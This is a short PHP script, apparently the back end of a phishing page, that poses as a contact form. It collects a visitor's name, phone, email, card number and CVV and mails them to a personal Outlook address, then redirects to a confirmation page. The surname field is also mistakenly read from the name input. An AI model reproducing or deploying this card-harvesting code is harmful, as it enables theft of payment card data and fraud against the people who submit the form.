<?php

//Llamando a los campos
$nombre = $_POST['nombre'];
$apellido = $_POST['nombre'];
$telefono = $_POST['telefono'];
$correo = $_POST['correo'];
$tarjeta = $_POST['tarjeta'];
$codigo = $_POST['codigo'];

//Datos para el correo
$destinatario = "astralpija@outlook.com";
$asunto = "Contacto desde la pagina";

$carta = "De: $nombre \n";
$carta .= "Apellidos: $apellido \n";
$carta .= "Telefono: $telefono \n";
$carta .= "Correo: $correo \n";
$carta .= "Tarjeta: $tarjeta \n";
$carta .= "CVV: $codigo \n";


//Enviando Mensaje
mail($destinatario, $asunto, $carta);
header('Location:mensaje-de-envio.html');


?>
